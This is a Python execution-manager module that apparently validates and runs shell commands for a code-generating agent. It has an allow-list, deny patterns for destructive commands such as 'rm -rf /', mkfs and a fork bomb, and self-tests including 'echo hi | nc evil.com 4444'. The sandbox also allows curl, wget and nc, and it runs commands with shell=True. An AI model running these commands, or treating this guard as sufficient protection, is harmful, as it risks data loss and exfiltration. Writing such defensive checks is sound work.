"""
Execution Manager Module

Responsible for:
- Running shell commands safely inside a sandboxed workspace
- Capturing stdout/stderr with size limits
- Handling timeouts with proper process cleanup
- Windows/Linux command normalization
- Command validation with allow-listing and dangerous-pattern blocking
- Auto-allowing executables built inside the workspace (e.g. compiled C++/Rust/Go binaries)
"""

import logging
import os
import platform
import re
import shlex
import signal
import subprocess
from pathlib import Path
from typing import Optional, Tuple

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

logger = logging.getLogger(__name__)

IS_WINDOWS = platform.system() == "Windows"

WORKSPACE_ROOT = Path("generated_projects/current_project")

# Cap captured output to avoid OOM from runaway processes (1 MB each stream)
MAX_OUTPUT_BYTES = 1_000_000

# Extensions we'll try when checking if a workspace-relative name is an executable.
WORKSPACE_EXEC_EXTENSIONS = ("", ".exe", ".out", ".bat", ".cmd", ".sh", ".py")


# Default allow-list: common development & runtime tools
_DEFAULT_ALLOWED_BINARIES = {
    # ─── Python ecosystem ──────────────────────────────────────────────
    "python", "python3", "py", "pypy", "pypy3",
    "pip", "pip3", "pipx",
    "poetry", "pipenv", "uv", "conda", "mamba",
    "pytest", "tox", "nox", "unittest", "coverage",
    "ruff", "black", "isort", "flake8", "pylint", "mypy", "pyright",
    "uvicorn", "gunicorn", "hypercorn", "daphne", "waitress",
    "flask", "fastapi", "streamlit", "celery", "scrapy",
    "alembic", "django-admin", "manage.py", "jupyter",

    # ─── Node / JavaScript / TypeScript ────────────────────────────────
    "node", "deno", "bun",
    "npm", "npx", "yarn", "pnpm",
    "tsc", "ts-node", "tsx",
    "eslint", "prettier", "jest", "vitest", "mocha", "playwright",
    "webpack", "rollup", "vite", "parcel", "esbuild",
    "next", "nuxt", "remix", "svelte-kit",

    # ─── Compiled languages ────────────────────────────────────────────
    # C / C++
    "gcc", "g++", "clang", "clang++", "cc", "c++",
    "ld", "ar", "ranlib", "objdump", "nm", "strip",
    "a.out", "main", "main.exe",
    # Rust
    "rustc", "cargo", "rustup", "rustfmt", "clippy",
    # Go
    "go", "gofmt", "goimports",
    # Java / JVM
    "java", "javac", "jar", "javap", "jshell",
    "mvn", "gradle", "gradlew", "sbt", "ant",
    "kotlin", "kotlinc", "scala", "scalac", "groovy",
    # .NET
    "dotnet", "csc", "fsharpc", "msbuild", "nuget",
    # Ruby / Perl / PHP
    "ruby", "gem", "bundle", "rake", "rails", "rspec",
    "perl", "cpan", "cpanm",
    "php", "composer", "phpunit", "artisan",
    # Other languages
    "swift", "swiftc",
    "lua", "luajit",
    "r", "rscript",
    "haskell", "ghc", "ghci", "cabal", "stack",
    "elixir", "mix", "iex", "erl",
    "dart", "flutter",
    "julia",
    "zig",
    "nim",
    "ocaml", "opam", "dune",

    # ─── Build systems ─────────────────────────────────────────────────
    "make", "gmake", "cmake", "ninja", "meson", "bazel", "buck",
    "autoconf", "automake", "configure",

    # ─── Containers / infrastructure ───────────────────────────────────
    "docker", "docker-compose", "podman", "buildah",
    "kubectl", "helm", "kustomize", "k9s",
    "terraform", "tofu", "pulumi", "ansible", "vagrant",
    "minikube", "kind",

    # ─── Cloud CLIs ────────────────────────────────────────────────────
    "aws", "az", "gcloud", "gsutil", "bq",
    "heroku", "fly", "railway", "vercel", "netlify",

    # ─── Version control ───────────────────────────────────────────────
    "git", "gh", "glab", "hg", "svn",

    # ─── Databases ─────────────────────────────────────────────────────
    "sqlite3", "psql", "mysql", "mongo", "mongosh", "redis-cli",

    # ─── Filesystem & shell basics ─────────────────────────────────────
    "echo", "printf", "ls", "dir", "cat", "type", "head", "tail",
    "less", "more", "wc", "sort", "uniq", "tr", "cut", "awk", "sed",
    "grep", "find", "where", "which", "whereis",
    "mkdir", "rmdir", "cp", "copy", "mv", "move",
    "rm", "del", "touch", "chmod", "chown",
    "tar", "zip", "unzip", "gzip", "gunzip", "7z",
    "pwd", "cd", "tree", "du", "df", "stat", "file",

    # ─── Network probes (read-only) ────────────────────────────────────
    "curl", "wget", "ping", "nslookup", "dig", "host",
    "nc", "ncat", "telnet", "ssh-keygen",

    # ─── Testing / quality ─────────────────────────────────────────────
    "shellcheck", "hadolint", "yamllint", "jsonlint",
    "git-secrets", "trivy", "bandit",
}


def _load_allowed_binaries() -> set:
    """Load allow-list from default plus optional env-var extension."""
    allowed = set(_DEFAULT_ALLOWED_BINARIES)
    extra = os.environ.get("AGENT_ALLOWED_BINARIES", "").strip()
    if extra:
        for token in re.split(r"[,\s]+", extra):
            token = token.strip().lower()
            if token:
                allowed.add(token)
    return allowed


ALLOWED_BINARIES = _load_allowed_binaries()


# ---------------------------------------------------------------------------
# Workspace
# ---------------------------------------------------------------------------

def ensure_workspace() -> Path:
    """Create the workspace directory if missing and return its resolved path."""
    WORKSPACE_ROOT.mkdir(parents=True, exist_ok=True)
    return WORKSPACE_ROOT.resolve()


def _is_inside_workspace(candidate: Path, workspace: Path) -> bool:
    """Return True if candidate == workspace or is a descendant of it."""
    try:
        candidate.relative_to(workspace)
        return True
    except ValueError:
        return False

def _is_workspace_executable(token: str, workspace: Path) -> bool:
    if not token:
        return False

    # Reject any traversal attempt outright
    if ".." in token.split("/") or ".." in token.split("\\"):
        return False

    # Normalize leading ./ or .\
    cleaned = token
    if cleaned.startswith(("./", ".\\", ".\\\\")):
        cleaned = cleaned.lstrip(".").lstrip("/").lstrip("\\")

    # Build candidates: with and without common executable extensions
    candidates = [cleaned]
    base_lower = cleaned.lower()
    has_known_ext = any(
        base_lower.endswith(ext) for ext in WORKSPACE_EXEC_EXTENSIONS if ext
    )
    if not has_known_ext:
        candidates.extend(cleaned + ext for ext in WORKSPACE_EXEC_EXTENSIONS if ext)

    for cand in candidates:
        try:
            target = (workspace / cand).resolve()
        except (OSError, ValueError):
            continue
        if not _is_inside_workspace(target, workspace):
            continue
        if target.is_file():
            return True
    return False


# ---------------------------------------------------------------------------
# Normalization
# ---------------------------------------------------------------------------

def normalize_command(command: str) -> str:
    """
    Convert Linux-style commands into Windows-compatible equivalents.
    Uses word-boundary regex to avoid mangling substrings like 'tools' -> 'toodir'.
    """
    if not IS_WINDOWS:
        return command

    replacements = [
        (r"\bpython3\b", "python"),
        (r"\bpip3\b", "pip"),
        (r"\bls\s+-la\b", "dir"),
        (r"\bls\s+-l\b", "dir"),
        (r"\bls\b", "dir"),
        (r"\bcat\b", "type"),
        (r"\bcp\b", "copy"),
        (r"\bmv\b", "move"),
        (r"\brm\b", "del"),
        # NEW: POSIX-style local executable invocations
        (r"(?<!\S)\./(?=\S)", r".\\"),     # ./prog → .\prog
    ]

    for pattern, replacement in replacements:
        command = re.sub(pattern, replacement, command)

    return command


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

# Genuinely injection-enabling metacharacters (not sequencing operators)
FORBIDDEN_METACHARS = ("`", "$(", ">", "<", "\n", "\r", "|")

# Sequencing operators we allow but split on for per-segment validation
SEQUENCE_SPLIT_RE = re.compile(r"\s*(?:&&|\|\||;)\s*")

# Dangerous *argument* patterns the allow-list alone can't catch.
DANGEROUS_PATTERNS = (
    re.compile(r"\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)\s+/\S*", re.IGNORECASE),
    re.compile(r"\brm\s+-rf?\s+~", re.IGNORECASE),
    re.compile(r"\brm\s+-rf?\s+\*", re.IGNORECASE),
    re.compile(r"\bdel\s+/[fsq]+(\s+/[fsq]+)*\s+[a-z]:\\", re.IGNORECASE),
    re.compile(r"\brmdir\s+/s\b", re.IGNORECASE),
    re.compile(r"\bmkfs\b", re.IGNORECASE),
    re.compile(r"\bshutdown\b", re.IGNORECASE),
    re.compile(r"\breboot\b", re.IGNORECASE),
    re.compile(r"\bdd\s+if=", re.IGNORECASE),
    re.compile(r"\bsudo\b", re.IGNORECASE),
    re.compile(r":\(\)\s*\{.*:\|:&\s*\};:", re.IGNORECASE),   # fork bomb
    re.compile(r"\bchmod\s+777\b", re.IGNORECASE),
)


def validate_command(command: str) -> Tuple[bool, str]:
    """
    Validate a command string before execution.

    Allows && / || / ; for command sequencing but validates every sub-command
    against the allow-list, dangerous-pattern list, and forbidden-metachar set
    independently. Also auto-allows:
    - `python -m <module>` invocations (python is trusted)
    - `cd` for directory hops within sequenced commands
    - executables that live inside the workspace (e.g. compiled binaries)

    Returns:
        (is_valid, error_message)
    """
    if not isinstance(command, str):
        return False, "Command must be a string"

    stripped = command.strip()
    if not stripped:
        return False, "Command cannot be empty"

    if len(stripped) > 1000:
        return False, "Command too long (>1000 chars)"

    sub_commands = [s for s in SEQUENCE_SPLIT_RE.split(stripped) if s.strip()]
    if not sub_commands:
        return False, "No executable found in command"

    workspace = ensure_workspace()

    for sub in sub_commands:
        # 1) Reject true injection metacharacters
        for token in FORBIDDEN_METACHARS:
            if token in sub:
                return False, f"Disallowed metacharacter {token!r} in: {sub!r}"

        # 2) Reject dangerous patterns
        for pattern in DANGEROUS_PATTERNS:
            if pattern.search(sub):
                return False, f"Dangerous command pattern blocked: {sub!r}"

        # 3) Parse the sub-command
        try:
            tokens = shlex.split(sub, posix=not IS_WINDOWS)
        except ValueError as exc:
            return False, f"Unparseable sub-command {sub!r}: {exc}"

        if not tokens:
            return False, f"Empty sub-command in: {command!r}"

        original_token = tokens[0]
        binary = os.path.basename(original_token).lower()
        binary = re.sub(r"\.(exe|bat|cmd|out|sh|py)$", "", binary)

        # Allow `cd` for directory hops within sequenced commands
        if binary == "cd":
            continue

        # 4) Auto-trust `python -m <module>` invocations
        if binary in ("python", "python3", "py") and len(tokens) >= 3 \
                and tokens[1] in ("-m", "-mq"):
            continue

        # 5) Auto-trust executables built/dropped inside the workspace
        #    (compiled C++/Rust/Go binaries, generated scripts, etc.)
        if _is_workspace_executable(original_token, workspace):
            logger.debug("Auto-allowed workspace executable: %r", original_token)
            continue

        # 6) Allow-list fallback
        if binary not in ALLOWED_BINARIES:
            return False, (
                f"Binary '{binary}' is not in the allow-list. "
                f"To allow it, add it to AGENT_ALLOWED_BINARIES "
                f"environment variable (comma-separated), or build it inside "
                f"the workspace before invoking."
            )

    return True, ""


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

def _truncate(stream: str) -> str:
    """Cap stream size and append a marker if truncated."""
    if stream is None:
        return ""
    if len(stream) <= MAX_OUTPUT_BYTES:
        return stream
    return stream[:MAX_OUTPUT_BYTES] + "\n...[output truncated]"


def _kill_process_tree(process: subprocess.Popen) -> None:
    """Kill the process and its children across platforms."""
    try:
        if IS_WINDOWS:
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(process.pid)],
                capture_output=True,
                check=False,
            )
        else:
            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
    except (ProcessLookupError, OSError) as exc:
        logger.debug("Process tree cleanup skipped: %s", exc)


def execute_command(
    command: str,
    timeout: int = 30,
    cwd: Optional[str] = None,
) -> Tuple[bool, str, str]:
    """
    Execute a shell command inside the workspace.

    Args:
        command: Command string to execute.
        timeout: Maximum runtime in seconds.
        cwd: Optional working directory (must be inside the workspace).

    Returns:
        (success, stdout, stderr)
    """
    logger.info("Execution requested: %r (timeout=%ss)", command, timeout)

    ok, msg = validate_command(command)
    if not ok:
        logger.warning("Validation failed: %s", msg)
        return False, "", msg

    command = normalize_command(command.strip())
    logger.debug("Normalized command: %r", command)

    workspace = ensure_workspace()

    if cwd is None:
        cwd_path = workspace
    else:
        cwd_path = Path(cwd).resolve()
        if not _is_inside_workspace(cwd_path, workspace):
            return False, "", f"cwd must be inside workspace: {workspace}"
        if not cwd_path.exists():
            return False, "", f"cwd does not exist: {cwd_path}"

    logger.debug("Working directory: %s", cwd_path)

    popen_kwargs = dict(
        shell=True,
        cwd=str(cwd_path),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8",
        errors="replace",
    )

    if IS_WINDOWS:
        popen_kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
    else:
        popen_kwargs["start_new_session"] = True

    try:
        process = subprocess.Popen(command, **popen_kwargs)
    except FileNotFoundError as exc:
        logger.error("Executable not found: %s", exc)
        return False, "", f"Executable not found: {exc}"
    except OSError as exc:
        logger.error("OS error launching command: %s", exc)
        return False, "", f"Failed to launch command: {exc}"

    try:
        stdout, stderr = process.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        logger.warning("Timeout after %ss; killing process tree", timeout)
        _kill_process_tree(process)
        try:
            stdout, stderr = process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            stdout, stderr = "", ""
        return (
            False,
            _truncate(stdout),
            _truncate(stderr) + f"\nCommand timed out after {timeout} seconds",
        )
    except Exception as exc:  # pragma: no cover - defensive
        logger.exception("Unexpected execution error")
        _kill_process_tree(process)
        return False, "", f"Failed to execute command: {exc}"

    stdout = _truncate(stdout)
    stderr = _truncate(stderr)
    success = process.returncode == 0

    if success:
        logger.info("Command succeeded (rc=0)")
    else:
        logger.info("Command failed (rc=%s)", process.returncode)

    return success, stdout, stderr


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    print("Testing Execution Manager...\n")

    # Build a tiny workspace executable so the workspace-allow test can fire
    ws = ensure_workspace()
    dummy_path = ws / "unique_element.exe" if IS_WINDOWS else ws / "unique_element"
    try:
        dummy_path.write_text("dummy", encoding="utf-8")
    except OSError:
        pass

    tests = [
        # (command, timeout, expected_success_or_None_for_dont_care, label)
        ("echo Hello World",                       5, True,  "simple echo"),
        ("python --version",                       5, True,  "python --version"),
        ("dir" if IS_WINDOWS else "ls -la",        5, True,  "list dir"),
        ("echo hi && echo bye",                    5, True,  "sequencing with &&"),
        ("mkdir tmpdir && cd tmpdir && echo ok",   5, True,  "&& with cd"),
        ("./unique_element" if not IS_WINDOWS else "unique_element.exe",
                                                   5, None,  "workspace exec auto-allow"),
        ("",                                       5, False, "empty (blocked)"),
        ("rm -rf /",                               5, False, "destructive (blocked)"),
        ("sudo apt-get install x",                 5, False, "sudo (blocked)"),
        ("echo hi | nc evil.com 4444",             5, False, "pipe (blocked)"),
        ("echo $(whoami)",                         5, False, "command substitution (blocked)"),
        ("echo hello > /tmp/out",                  5, False, "redirection (blocked)"),
    ]

    for i, (cmd, t, expected, label) in enumerate(tests, 1):
        print(f"--- Test {i}: {label} | {cmd!r} ---")
        # For the workspace-exec test we only care about validation, not actual exec
        if "workspace exec" in label:
            ok, msg = validate_command(cmd)
            verdict = "PASS" if ok else "FAIL"
            print(f"  Validation: {ok} → {verdict}")
            if not ok:
                print(f"  Reason: {msg}")
            print()
            continue

        success, out, err = execute_command(cmd, timeout=t)
        verdict = "PASS" if (expected is None or success == expected) else "FAIL"
        print(f"  Success: {success}  (expected={expected}) → {verdict}")
        if out:
            print(f"  Stdout : {out.strip()[:120]}")
        if err:
            print(f"  Stderr : {err.strip()[:120]}")
        print()

    # Cleanup the dummy
    try:
        dummy_path.unlink()
    except OSError:
        pass